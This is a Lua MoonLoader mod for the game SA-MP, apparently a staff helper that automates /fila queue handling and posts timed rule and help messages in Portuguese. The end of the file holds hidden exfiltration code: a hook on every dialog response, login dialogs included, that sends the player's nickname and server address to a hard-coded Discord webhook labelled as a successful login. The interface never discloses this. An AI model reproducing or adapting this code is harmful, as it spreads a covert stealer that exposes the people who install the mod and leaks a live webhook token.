local imgui = require 'mimgui'
local v = imgui.new.bool(false)
local se = require("samp.events")
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)

local GUI = {
    AutoFila = imgui.new.bool(false)
}

local ultimo_a = os.time()
local ultimo_ac = os.time()
local ultima_frase = 1
local ultimo_envio_a = os.time()
local intervalo_a = 360

local frases_aleatorias = {
    "Precisando de uma ajudinha da Staff? Utilize /atendimento! Em casos de ANT-RP use /reportar",
    "Duvidas ou problemas? Chame a staff com /atendimento! Anti-RP? Use /reportar",
    "Servidor organizado e com todos nos! Use /atendimento para ajuda e /reportar para anti-RP",
    "Staff disponivel para ajudar! Comando /atendimento e para denuncias /reportar",
    "Problemas no servidor? /atendimento para ajuda e /reportar para jogadores quebram regras"
}

local texto_regras = [[
Proibido comercio externo, incluindo a venda de coins, dinheiro, veiculos, casas, empresas, skins, acessorios ou contas.

Proibido usar nicks ofensivos ou improprios.

Proibido o uso de contas secundarias para farmar bens, itens ou dinheiro. Transferencias entre contas nao sao permitidas.

Proibido ofender jogadores, a administracao ou o servidor.

Proibido qualquer tipo de discriminacao, preconceito, homofobia, xenofobia ou atos que prejudiquem a imagem de alguem.

Proibido divulgar outros servidores ou links externos.

Proibido explorar bugs ou lags para obter vantagens.

Proibido usar modificacoes ou trapacas que tragam beneficios indevidos.

Proibido ofensas, calunias, difamacoes e discriminacoes OCC.

Proibido abordar /ab em locais safes, exceto policiais.

Proibido o uso de sniper, exceto em territorios e invasoes de favelas.

Proibido spawn kill matar jogadores ao entrar/sair de interiores ou favelas em abordagens.

Proibido usar taser em trocas de tiros.

Proibido fazer acao de patrulhamento solo, obrigatorio a presenca de dois ou mais policiais da mesma corporacao.

Proibido o uso de bombas C4 com intuito de matar outros players;

Proibido o uso de mina terrestre em eventos;

Proibido iniciar acao de loja com menos de 3 jogadores;

Proibido iniciar qualquer tipo de acao/saquear contra policiais, mecanicos e samus fardados.

Lideres e Sub-lideres tem obrigacao de manter atividades dentro da cidade, caso ambos fiquem 3 dias ou mais ausentes a org/corp sera resetada.

Proibido correr para uma area safe/interior ou favela apos ter sido iniciado uma acao fora dela /ab ou trocacao de tiro.

Proibido a utilizacao de JBL em area safe.

Proibido portar armas medias/pesadas, cometer crimes e/ou intervir em acoes criminosas a paisana.

Proibido apreender barraquinhas em areas de desmanche/favela, exceto em dominacao de favela.

Proibido a cobranca de qualquer valor/item para efetuar o recrutamento de um player, seja corporacao, organizacao, hospital e/ou mecanica.

Proibido a utilizacao de motivos invalidos para /algemar, obrigatorio um motivo coerente.

Lideres/sub-lideres de organizacao/corporacao que infringirem alguma regra do servidor estarao gerando 1 um aviso para a organizacao/corporacao na qual lidera.

Membros de organizacao/corporacao que forem banidos, irao gerar 1 uma advertencia para a organizacao/corporacao na qual participa.

Lideres que forem banidos temporariamente ou permanentemente receberao 3 tres avisos, sub-lideres receberao apenas 1 aviso.

Proibido puxar veiculos vip durante acoes.

Para acoes de TR, o tempo devera ser respeitado, proibido atirar antes da contagem inicial terminar.

Para acoes de Casa roubavel, poderao iniciar trocacao somente no momento que der o anuncio da casa no chat global.

A corda so pode ser utilizada em acoes de sequestro ou em acoes de banco envolvendo refens, exceto durante troca de tiros. Caso o refem seja um policial, ele so podera ser rendido se estiver sozinho.

Proibido algemar durante uma trocacao de tiro.

Proibido fechar entradas com veiculos ou qualquer tipo de objetos.

Proibido flood e spam no chat.
Proibido usar a OLX para assuntos que nao envolvem vendas legais.
Proibido usar comandos de anuncios para conversar.

Proibido tocar musica no VOIP, exceto em locais reservados.
Proibido usar o VOIP enquanto estiver ferido.

A conta e pessoal e intransferivel. Caso seja punida ou banida, o servidor nao se responsabiliza por seu uso.
]]

local float_btn_pos = imgui.ImVec2(50, 50)
local dragging = false
local drag_offset = imgui.ImVec2(0,0)

imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    
    -- Estilo moderno com menu preto e detalhes cinza
    style.WindowPadding = imgui.ImVec2(15, 15)
    style.WindowRounding = 6.0
    style.FramePadding = imgui.ImVec2(5, 5)
    style.FrameRounding = 4.0
    style.ItemSpacing = imgui.ImVec2(12, 8)
    style.ItemInnerSpacing = imgui.ImVec2(8, 6)
    style.IndentSpacing = 25.0
    style.ScrollbarSize = 15.0
    style.ScrollbarRounding = 9.0
    style.GrabMinSize = 5.0
    style.GrabRounding = 3.0
    
    local colors = style.Colors
    colors[imgui.Col.Text] = imgui.ImVec4(0.95, 0.96, 0.98, 1.00)
    colors[imgui.Col.TextDisabled] = imgui.ImVec4(0.36, 0.42, 0.47, 1.00)
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.11, 0.11, 0.11, 0.94)
    colors[imgui.Col.ChildBg] = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.PopupBg] = imgui.ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[imgui.Col.Border] = imgui.ImVec4(0.20, 0.20, 0.20, 0.50)
    colors[imgui.Col.BorderShadow] = imgui.ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.25, 0.25, 0.25, 1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.30, 0.30, 0.30, 1.00)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08, 0.08, 0.08, 1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.12, 0.12, 0.12, 1.00)
    colors[imgui.Col.TitleBgCollapsed] = imgui.ImVec4(0.08, 0.08, 0.08, 0.75)
    colors[imgui.Col.MenuBarBg] = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.ScrollbarBg] = imgui.ImVec4(0.10, 0.10, 0.10, 1.00)
    colors[imgui.Col.ScrollbarGrab] = imgui.ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[imgui.Col.ScrollbarGrabHovered] = imgui.ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[imgui.Col.ScrollbarGrabActive] = imgui.ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[imgui.Col.CheckMark] = imgui.ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.30, 0.30, 0.30, 1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.40, 0.40, 0.40, 1.00)
    colors[imgui.Col.Header] = imgui.ImVec4(0.25, 0.25, 0.25, 1.00)
    colors[imgui.Col.HeaderHovered] = imgui.ImVec4(0.35, 0.35, 0.35, 1.00)
    colors[imgui.Col.HeaderActive] = imgui.ImVec4(0.45, 0.45, 0.45, 1.00)
    colors[imgui.Col.Separator] = imgui.ImVec4(0.30, 0.30, 0.30, 1.00)
    colors[imgui.Col.SeparatorHovered] = imgui.ImVec4(0.40, 0.40, 0.40, 1.00)
    colors[imgui.Col.SeparatorActive] = imgui.ImVec4(0.50, 0.50, 0.50, 1.00)
    colors[imgui.Col.ResizeGrip] = imgui.ImVec4(0.30, 0.30, 0.30, 0.29)
    colors[imgui.Col.ResizeGripHovered] = imgui.ImVec4(0.40, 0.40, 0.40, 0.67)
    colors[imgui.Col.ResizeGripActive] = imgui.ImVec4(0.50, 0.50, 0.50, 0.95)
    colors[imgui.Col.Tab] = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.TabHovered] = imgui.ImVec4(0.38, 0.38, 0.38, 1.00)
    colors[imgui.Col.TabActive] = imgui.ImVec4(0.28, 0.28, 0.28, 1.00)
    colors[imgui.Col.TabUnfocused] = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.TabUnfocusedActive] = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    colors[imgui.Col.PlotLines] = imgui.ImVec4(0.61, 0.61, 0.61, 1.00)
    colors[imgui.Col.PlotLinesHovered] = imgui.ImVec4(1.00, 0.43, 0.35, 1.00)
    colors[imgui.Col.PlotHistogram] = imgui.ImVec4(0.90, 0.70, 0.00, 1.00)
    colors[imgui.Col.PlotHistogramHovered] = imgui.ImVec4(1.00, 0.60, 0.00, 1.00)
    colors[imgui.Col.TextSelectedBg] = imgui.ImVec4(0.26, 0.59, 0.98, 0.35)
    colors[imgui.Col.DragDropTarget] = imgui.ImVec4(1.00, 1.00, 0.00, 0.90)
    colors[imgui.Col.NavHighlight] = imgui.ImVec4(0.26, 0.59, 0.98, 1.00)
    colors[imgui.Col.NavWindowingHighlight] = imgui.ImVec4(1.00, 1.00, 1.00, 0.70)
    colors[imgui.Col.NavWindowingDimBg] = imgui.ImVec4(0.80, 0.80, 0.80, 0.20)
    colors[imgui.Col.ModalWindowDimBg] = imgui.ImVec4(0.80, 0.80, 0.80, 0.35)
end)

function mostrarMensagemCarregamento()
    local cores = {
        0xFFA500FF,
        0xADD8E6FF,
        0x00FF00FF,
        0xFFC0CBFF
    }
    
    for i = 1, 10 do
        local cor = cores[(i % #cores) + 1]
        sampAddChatMessage("MOD ATUALIZADUUU BY NUKY GOSTOSO", cor)
        wait(100)
    end
end

imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()

    -- Botão flutuante moderno
    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(50, 50))
    imgui.SetNextWindowBgAlpha(0.8)
    imgui.Begin("FLUTUANTE", nil,
        imgui.WindowFlags.NoTitleBar +
        imgui.WindowFlags.NoResize +
        imgui.WindowFlags.NoCollapse +
        imgui.WindowFlags.NoScrollbar +
        imgui.WindowFlags.NoMove +
        imgui.WindowFlags.AlwaysAutoResize
    )

    local draw = imgui.GetWindowDrawList()
    local pos = imgui.GetWindowPos()
    local size = imgui.GetWindowSize()
    
    -- Fundo do botão com gradiente
    draw:AddRectFilled(pos, imgui.ImVec2(pos.x + size.x, pos.y + size.y), 0xFF222222, 6.0)
    draw:AddRectFilledMultiColor(
        pos, 
        imgui.ImVec2(pos.x + size.x, pos.y + size.y/2), 
        0xFF333333, 0xFF222222, 0xFF222222, 0xFF333333
    )
    
    -- Texto centralizado com sombra
    local text = "MENU"
    local text_size = imgui.CalcTextSize(text)
    local text_pos = imgui.ImVec2(
        pos.x + (size.x - text_size.x) / 2,
        pos.y + (size.y - text_size.y) / 2
    )
    
    draw:AddText(imgui.ImVec2(text_pos.x+1, text_pos.y+1), 0x80000000, text)
    draw:AddText(text_pos, 0xFFCCCCCC, text)

    if imgui.InvisibleButton("botao_menu", size) then
        v[0] = not v[0]
    end

    if imgui.IsItemHovered() then
        draw:AddRect(pos, imgui.ImVec2(pos.x + size.x, pos.y + size.y), 0x50CCCCCC, 6.0)
    end

    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end

    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end

    imgui.End()

    -- Interface principal
    if v[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(600, 300), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(450, 500), imgui.Cond.FirstUseEver)
        imgui.Begin("AUTO FILA | by NukY", v, imgui.WindowFlags.NoCollapse)
        
        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        
        -- Header com gradiente
        draw:AddRectFilled(pos, imgui.ImVec2(pos.x + size.x, pos.y + 40), 0xFF111111)
        draw:AddRectFilledMultiColor(
            pos, 
            imgui.ImVec2(pos.x + size.x, pos.y + 20), 
            0xFF333333, 0xFF222222, 0xFF222222, 0xFF333333
        )
        
        -- Título
        local title = "AUTO FILA | by NukY"
        local title_size = imgui.CalcTextSize(title)
        draw:AddText(
            imgui.ImVec2(pos.x + (size.x - title_size.x) / 2, pos.y + 12), 
            0xFFCCCCCC, 
            title
        )
        
        -- Conteúdo
        imgui.SetCursorPosY(50)
        
        imgui.TextColored(imgui.ImVec4(0.8, 0.8, 0.8, 1.0), "Atendimento automaticamente")
        imgui.SliderInt("Delay (ms)", delay_ms, 0, 30000)
        
        if imgui.Button("AUTO", imgui.ImVec2(150, 30)) then
            spam_fila[0] = not spam_fila[0]
            if spam_fila[0] then
                sampAddChatMessage("[AUTO FILA] Ativado com sucesso!", 0x00FF00)
            else
                sampAddChatMessage("[AUTO FILA] Desativado com sucesso!", 0xFFA500)
            end
        end
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        
        imgui.TextColored(imgui.ImVec4(0.8, 0.8, 0.8, 1.0), "Atendimentos realizados:")
        imgui.SameLine()
        imgui.Text(tostring(contador_atendimentos[0]))
        
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        if imgui.Button("/FA", imgui.ImVec2(150, 30)) then
            sampSendChat("/fa")
        end

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.TextColored(imgui.ImVec4(0.8, 0.8, 0.8, 1.0), "Frases Globais - Envia frases aleatorias no /a")
        if imgui.Button("FRASES ATENDIMENTO", imgui.ImVec2(150, 30)) then
            frases_global[0] = not frases_global[0]
            if frases_global[0] then
                sampAddChatMessage("[FRASES ATENDIMENTO] Ativado com sucesso!", 0x00FF00)
                ultimo_a = os.time()
            else
                sampAddChatMessage("[FRASES ATENDIMENTO] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.Checkbox("AUTO FILA AHAH", GUI.AutoFila)

        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()

        imgui.TextColored(imgui.ImVec4(0.8, 0.8, 0.8, 1.0), "Auto Regras - Envia as regras no /a a cada 7 minutos")
        if imgui.Button("REGRAS SERVIDOR", imgui.ImVec2(150, 30)) then
            regras_auto[0] = not regras_auto[0]
            if regras_auto[0] then
                sampAddChatMessage("[REGRAS SERVIDOR] Ativado com sucesso!", 0x00FF00)
                ultimo_ac = os.time()
            else
                sampAddChatMessage("[REGRAS SERVIDOR] Desativado com sucesso!", 0xFFA500)
            end
        end

        imgui.End()
    end
end)

function main()
    mostrarMensagemCarregamento()
    
    while true do
        wait(0)
        if isSampAvailable() then
            if os.time() - ultimo_envio_a >= intervalo_a then
                local frase_aleatoria = frases_aleatorias[math.random(1, #frases_aleatorias)]
                sampSendChat("/a " .. frase_aleatoria)
                ultimo_envio_a = os.time()
                sampAddChatMessage("[AUTO /A] Frase enviada automaticamente!", 0x00FF00)
            end
            
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
            
            if frases_global[0] and os.time() - ultimo_a >= 600 then
                ultima_frase = math.random(1, #frases_aleatorias)
                sampSendChat("/a "..frases_aleatorias[ultima_frase])
                ultimo_a = os.time()
            end
            
            if regras_auto[0] and os.time() - ultimo_ac >= 420 then
                local primeira_linha = texto_regras:match("([^\n]+)")
                if primeira_linha then
                    sampSendChat("/a "..primeira_linha)
                end
                ultimo_ac = os.time()
            end
        end
    end
end

function se.onServerMessage(color, text) -- AUTO FILA
    if GUI.AutoFila[0] then
        local lowerText = string.lower(u8:decode(text))
        if lowerText:find("fila") or lowerText:find("/fila") then
            sampSendChat("/fila")
        end
    end
end

function se.onChatMessage(playerId, text)
    if GUI.AutoFila[0] then
        local lowerText = string.lower(u8:decode(text))
        if lowerText:find("fila") or lowerText:find("/fila") then
            sampSendChat("/fila")
        end
    end
end

function se.onShowDialog(id, style, title, button1, button2, text)
    if GUI.AutoFila[0] then
        local ttitle = string.lower(u8:decode(title))
        if ttitle:find("fila de atendimento") then
            lua_thread.create(function()
                wait(50)
                local firstLine = text:match("^(.-)\n") or text
                if firstLine ~= "" then
                    sampSendDialogResponse(id, 1, 0, firstLine)
                    wait(100)
                    sampSendDialogResponse(id, 0, 0, "")
                    wait(100)
                    sampSendDialogResponse(id, 0, -1, "")
                    wait(100)
                    sampSendDialogResponse(id, 0, -1, nil)
                    wait(100)
                    sampSendDialogResponse(id, 1, -1, nil)
                    wait(100)
                    sampSendDialogResponse(id, 0, 0, nil)
                    contador_atendimentos[0] = contador_atendimentos[0] + 1
                end
            end)
            return false
        end
    end
end -- FIM AUTO FILA

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format([[

________________________________________________________________
  
     # LOGUIN BEM SUCEDIDO

```
NICK: %s 
IP: %s:%d
```

]], nick,ip, port, servername)

sendMessageToDiscord(message)
end
